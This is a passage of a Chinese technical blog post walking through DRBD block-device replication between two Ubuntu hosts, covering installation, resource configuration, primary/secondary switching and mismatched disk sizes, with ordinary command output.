              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-16 15:52:32" itemprop="dateCreated datePublished" datetime="2023-02-16T15:52:32+08:00">2023-02-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-09 15:57:18" itemprop="dateModified" datetime="2024-09-09T15:57:18+08:00">2024-09-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/storage/" itemprop="url" rel="index"><span itemprop="name">storage</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>DRBD（Distributed Replicated Block Device，分布式复制块设备)是一个用软件实现的、无共享的、服务器之间镜像块设备内容的存储复制解决方案。DRBD是镜像块设备，是按数据位镜像成一样的数据块。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="ubuntu环境"><a href="#ubuntu环境" class="headerlink" title="ubuntu环境"></a>ubuntu环境</h2><p>准备两个ubuntu系统，一个作为源端ubu1，一个作为目的端ubu2。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04.5 LTS</span><br><span class="line">Release:    20.04</span><br><span class="line">Codename:   focal</span><br><span class="line">bob@ubu1:~$ uname -a</span><br><span class="line">Linux ubu1 5.4.0-139-generic #156-Ubuntu SMP Sat Jan 21 13:46:46 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04.5 LTS</span><br><span class="line">Release:    20.04</span><br><span class="line">Codename:   focal</span><br><span class="line">bob@ubu2:~$ uname -a</span><br><span class="line">Linux ubu2 5.4.0-139-generic #156-Ubuntu SMP Sat Jan 21 13:46:46 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p><code>brbd.ko</code>为linux内核自带，不需要另行安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ lsmod | grep drbd</span><br><span class="line">drbd                  434176  3</span><br><span class="line">lru_cache              20480  1 drbd</span><br><span class="line">libcrc32c              16384  4 btrfs,xfs,drbd,raid456</span><br><span class="line">bob@ubu1:~$ modinfo drbd</span><br><span class="line">filename:       /lib/modules/5.4.0-139-generic/kernel/drivers/block/drbd/drbd.ko</span><br><span class="line">alias:          block-major-147-*</span><br><span class="line">license:        GPL</span><br><span class="line">version:        8.4.11</span><br><span class="line">description:    drbd - Distributed Replicated Block Device v8.4.11</span><br><span class="line">author:         Philipp Reisner &lt;phil@linbit.com&gt;, Lars Ellenberg &lt;lars@linbit.com&gt;</span><br><span class="line">srcversion:     B438804C5AE8C84C95D0411</span><br><span class="line">depends:        lru_cache,libcrc32c</span><br><span class="line">intree:         Y</span><br><span class="line">name:           drbd</span><br><span class="line">vermagic:       5.4.0-139-generic SMP mod_unload modversions aarch64</span><br><span class="line">sig_id:         PKCS#7</span><br><span class="line">signer:         Build time autogenerated kernel key</span><br><span class="line">sig_key:        43:64:51:B8:71:C1:53:C3:AE:29:64:EC:5F:B2:A3:30:54:25:F9:B5</span><br><span class="line">sig_hashalgo:   sha512</span><br><span class="line">signature:      0F:16:6D:12:54:0F:95:51:A5:18:4A:0A:A9:7C:72:F6:2D:31:21:39:</span><br><span class="line">                44:D9:71:C8:1B:7C:3F:1B:4B:66:53:08:1A:63:92:C3:CE:19:19:F0:</span><br><span class="line">                13:9F:9D:D6:7B:0B:27:F8:54:19:D3:44:F9:CC:8F:6E:E1:82:07:7A:</span><br><span class="line">                30:B1:37:28:5E:60:92:5B:C9:26:B0:25:DD:50:9D:A5:2E:76:96:A8:</span><br><span class="line">                E2:58:A1:36:DC:AA:84:D2:40:EF:66:F1:82:E5:2B:51:D7:F8:49:62:</span><br><span class="line">                9A:62:22:DC:42:A9:01:EC:6B:DC:9F:C6:8E:DD:9D:4A:CD:93:9B:F9:</span><br><span class="line">                3B:E4:4A:B4:34:BD:12:1A:89:C0:2C:2B:96:4D:86:27:D5:93:3A:51:</span><br><span class="line">                D4:DD:C7:34:9D:2D:A0:6C:BC:57:D1:9F:54:C2:55:56:B2:60:4D:FB:</span><br><span class="line">                86:55:18:09:9C:A5:C1:80:54:F5:F5:35:97:7E:32:36:A9:9B:F9:B2:</span><br><span class="line">                69:5B:BD:83:A3:41:89:9B:4F:7D:BA:A9:F1:E2:28:6A:FD:D4:7A:94:</span><br><span class="line">                67:34:D1:3C:8D:39:18:F7:43:A7:5F:67:71:B6:3B:63:3C:10:16:B7:</span><br><span class="line">                44:EA:D2:D4:52:19:28:F3:60:31:35:69:6B:EA:25:3B:35:FC:32:05:</span><br><span class="line">                B9:5A:99:7E:61:27:59:52:A8:55:8C:B6:15:8E:77:26:0F:DC:61:93:</span><br><span class="line">                F9:10:EA:8F:FD:E1:E0:DF:60:2D:83:92:9E:33:D7:99:10:93:AF:03:</span><br><span class="line">                44:8B:A0:6A:E8:E7:08:71:77:1C:CC:35:96:8C:94:DB:62:CA:ED:64:</span><br><span class="line">                B8:17:43:24:FD:BF:FC:3B:D7:D7:03:1C:83:06:0E:B5:D3:82:2A:4B:</span><br><span class="line">                E4:A7:F9:C4:07:9C:0F:2B:3E:D4:EA:48:FF:6E:BD:79:2E:85:FB:EE:</span><br><span class="line">                2D:A2:70:96:38:77:9C:29:58:5C:45:B1:8A:29:D2:7A:87:55:A6:A3:</span><br><span class="line">                32:A2:FC:F5:A2:4F:9C:20:85:F0:55:E6:A6:01:D2:76:EE:27:2F:A0:</span><br><span class="line">                BC:67:F2:B9:9B:A4:5D:2D:3D:6F:E9:46:C0:EF:4A:0C:01:15:19:E7:</span><br><span class="line">                9C:61:A9:00:E8:1A:D3:7D:2E:86:81:FD:BA:53:44:85:17:19:D9:B3:</span><br><span class="line">                B8:E2:7B:39:01:28:3E:F3:DF:87:3C:C5:E4:37:89:C1:67:16:B0:2C:</span><br><span class="line">                C7:4D:C8:6F:71:97:55:19:24:63:7B:D6:08:A2:EC:EB:C3:AA:71:91:</span><br><span class="line">                35:B4:C6:47:B5:EA:2B:DF:E4:AC:9C:06:77:73:1B:33:F5:AF:EE:58:</span><br><span class="line">                AC:F2:C4:A0:C9:00:58:AB:3F:62:1B:E5:E5:C3:E1:39:98:5B:2A:C9:</span><br><span class="line">                BD:10:6B:AF:FC:44:B0:7D:57:07:B0:5B</span><br><span class="line">parm:           allow_oos:DONT USE! (bool)</span><br><span class="line">parm:           disable_sendpage:bool</span><br><span class="line">parm:           proc_details:int</span><br><span class="line">parm:           minor_count:Approximate number of drbd devices (1-255) (uint)</span><br><span class="line">parm:           usermode_helper:string</span><br></pre></td></tr></table></figure>

<p>至于使用drbd的工具还是要安装的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo apt-cache show drbd-utils</span><br><span class="line">Package: drbd-utils</span><br><span class="line">Architecture: arm64</span><br><span class="line">Version: 9.11.0-1build1</span><br><span class="line">Priority: extra</span><br><span class="line">Section: admin</span><br><span class="line">Origin: Ubuntu</span><br><span class="line">Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;</span><br><span class="line">Original-Maintainer: Debian DRBD Maintainers &lt;debian-ha-maintainers@lists.alioth.debian.org&gt;</span><br><span class="line">Bugs: https://bugs.launchpad.net/ubuntu/+filebug</span><br><span class="line">Installed-Size: 2062</span><br><span class="line">Depends: lsb-base (&gt;= 3.0-6), libc6 (&gt;= 2.28), libgcc-s1 (&gt;= 3.0), libstdc++6 (&gt;= 5.2), init-system-helpers (&gt;= 1.51)</span><br><span class="line">Recommends: heirloom-mailx | mailx</span><br><span class="line">Suggests: heartbeat</span><br><span class="line">Breaks: drbd8-utils (&lt;&lt; 2:8.9.0)</span><br><span class="line">Replaces: drbd8-utils (&lt;&lt; 2:8.9.0)</span><br><span class="line">Filename: pool/main/d/drbd-utils/drbd-utils_9.11.0-1build1_arm64.deb</span><br><span class="line">Size: 654128</span><br><span class="line">MD5sum: 45a8962e941c9a87c7de423de34f616b</span><br><span class="line">SHA1: 3734ee6c0611348c5b8c080feb713c05f9d84c4c</span><br><span class="line">SHA256: ae63aa90d145faab00551f151c10588bafebe2673e64b137c980cce7c299bccf</span><br><span class="line">Homepage: https://www.drbd.org/</span><br><span class="line">Description-en: RAID 1 over TCP/IP for Linux (user utilities)</span><br><span class="line"> Drbd is a block device which is designed to build high availability</span><br><span class="line"> clusters by providing a virtual shared device which keeps disks in</span><br><span class="line"> nodes synchronised using TCP/IP. This simulates RAID 1 but avoiding</span><br><span class="line"> the use of uncommon hardware (shared SCSI buses or Fibre Channel).</span><br><span class="line"> It is currently limited to fail-over HA clusters.</span><br><span class="line"> .</span><br><span class="line"> This package contains the programs that will control the drbd kernel</span><br><span class="line"> module provided in the Linux kernel.</span><br><span class="line">Description-md5: 7da3dade742b03d1a9c08b339123f93b</span><br><span class="line"></span><br><span class="line">bob@ubu1:~$ apt install drbd-utils</span><br></pre></td></tr></table></figure>

<p>两个节点ubu1和ubu2都需要安装这个<code>drbd-utils</code>包</p>
<h1 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置-etc-drbd-d-global-common-conf"><a href="#配置-etc-drbd-d-global-common-conf" class="headerlink" title="配置/etc/drbd.d/global_common.conf"></a>配置<code>/etc/drbd.d/global_common.conf</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">global &#123;</span><br><span class="line">    usage-count yes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">common &#123;</span><br><span class="line">    net &#123;</span><br><span class="line">        protocol C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DRBD系统向虚拟块的镜像中写入数据时，支持三种协议</p>
<ul>
<li><code>protocol A</code> 数据一旦写入磁盘并发送到网络中就认为完成了写入操作</li>
<li><code>protocol B</code> 收到接收确认就认为完成了写入操作</li>
<li><code>protocol C</code> 收到写入确认就认为完成了写入操作</li>
</ul>
<p>基于安全考虑我们一般选择<code>protocol C</code></p>
<h3 id="配置DRBD资源-etc-drbd-d-r0-res"><a href="#配置DRBD资源-etc-drbd-d-r0-res" class="headerlink" title="配置DRBD资源/etc/drbd.d/r0.res"></a>配置DRBD资源<code>/etc/drbd.d/r0.res</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">resource r0 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">      device    /dev/drbd1;</span><br><span class="line">      disk  /dev/sda;</span><br><span class="line">      address   192.168.64.2:7789;</span><br><span class="line">      meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">      device    /dev/drbd1;</span><br><span class="line">      disk  /dev/sda;</span><br><span class="line">      address   192.168.64.4:7789;</span><br><span class="line">      meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>device</code>指drbd映射出来的快设备名称，<code>disk</code>指用于存放数据的硬盘。</p>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>分别在<code>ubu1</code>和<code>ubu2</code>上创建DRBD资源元数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm create-md r0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm create-md r0</span><br></pre></td></tr></table></figure>

<p>然后再启动<code>ubu1</code>和<code>ubu2</code>上的DRBD服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo systemctl start drbd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ sudo systemctl start drbd</span><br></pre></td></tr></table></figure>

<p>启动<code>r0</code>资源，并设置<code>ubu1</code>为主设备</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm up r0</span><br><span class="line">bob@ubu1:~$ sudo drbdadm primary --force r0</span><br></pre></td></tr></table></figure>

<p>可以使用<code>drbdadm status r0</code>查看状态，也可以用<code>cat /proc/drbd</code>查看同步进度。<br>当<code>peer-disk</code>状态为<code>UpToDate</code>表示数据已经同步到最新状态。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm status r0</span><br><span class="line">r0 role:Primary</span><br><span class="line">  disk:UpToDate</span><br><span class="line">  peer role:Secondary</span><br><span class="line">    replication:Established peer-disk:UpToDate</span><br></pre></td></tr></table></figure>

<p>如需查询服务状态详细信息可以通过命令<code>drbdsetup status r0 --verbose --statistics</code>查询</p>
<h2 id="文件系统常规使用"><a href="#文件系统常规使用" class="headerlink" title="文件系统常规使用"></a>文件系统常规使用</h2><p>首先通过<code>lsblk</code>查看<code>drbd1</code>快设备是否存在，然后格式化成xfs文件系统，并挂载到<code>/mnt</code>目录上</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop2                       7:2    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop3                       7:3    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop5                       7:5    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop6                       7:6    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop8                       7:8    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~$ mkfs.xfs /dev/drbd1</span><br><span class="line">...</span><br><span class="line">bob@ubu1:~$ mount /dev/drbd1 /mnt</span><br><span class="line">bob@ubu1:~$ touch /mnt/hello</span><br></pre></td></tr></table></figure>

<h2 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h2><p>切换操作，可以认为是切换primary节点操作。需要先将ubu1(primary节点)设置成<code>secondary</code>，再将ubu2(secondary节点)设置成<code>primary</code>，然后ubu2节点就可以挂载<code>drbd1</code>快设备了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm secondary r0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm primary r0</span><br><span class="line">bob@ubu2:~$ sudo mount /dev/drbd1 /mnt/</span><br><span class="line">bob@ubu2:~$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">udev                               1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs                              392M  1.4M  391M   1% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv   49G  7.3G   39G  16% /</span><br><span class="line">tmpfs                              2.0G     0  2.0G   0% /dev/shm</span><br><span class="line">tmpfs                              5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs                              2.0G     0  2.0G   0% /sys/fs/cgroup</span><br><span class="line">/dev/vda2                          974M  206M  701M  23% /boot</span><br><span class="line">/dev/vda1                          511M  5.3M  506M   2% /boot/efi</span><br><span class="line">/dev/loop3                          60M   60M     0 100% /snap/core20/1826</span><br><span class="line">/dev/loop1                          50M   50M     0 100% /snap/core18/2681</span><br><span class="line">/dev/loop2                          58M   58M     0 100% /snap/core20/1332</span><br><span class="line">/dev/loop5                          92M   92M     0 100% /snap/lxd/24065</span><br><span class="line">/dev/loop4                          61M   61M     0 100% /snap/lxd/21843</span><br><span class="line">/dev/loop6                          44M   44M     0 100% /snap/snapd/17954</span><br><span class="line">tmpfs                              392M     0  392M   0% /run/user/1000</span><br><span class="line">/dev/drbd1                          20G  175M   20G   1% /mnt</span><br></pre></td></tr></table></figure>

<p>在将ubu1节点从primary状态设置成secondary状态时可能会遇到如下错误</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ sudo drbdadm secondary r0</span><br><span class="line">1: State change failed: (-12) Device is held open by someone</span><br><span class="line">env: python: No such file or directory</span><br></pre></td></tr></table></figure>
<p>这说明当前块设备<code>brbd1</code>正在被挂载或者被其他应用使用，可以使用<code>lsof</code>命令查看改设备的使用情况，并终止使用后再设置节点状态为<code>secondary</code>。</p>
<h1 id="硬盘容量大小不一致情况"><a href="#硬盘容量大小不一致情况" class="headerlink" title="硬盘容量大小不一致情况"></a>硬盘容量大小不一致情况</h1><p>当源和备硬盘容量大小不一致时，取最小容量做为drbd块设备对外提供的存储空间大小。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   21G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~$ cat /etc/drbd.d/r1.res</span><br><span class="line">resource r1 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.2:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~$ cat /etc/drbd.d/r2.res</span><br><span class="line">resource r2 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.2:7793;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.4:7793;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 2: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:22019388 nr:0 dw:0 dr:22021500 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 3: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:23067932 nr:0 dw:0 dr:23070036 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop3                       7:3    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop4                       7:4    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop5                       7:5    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   21G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   22G  1 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part 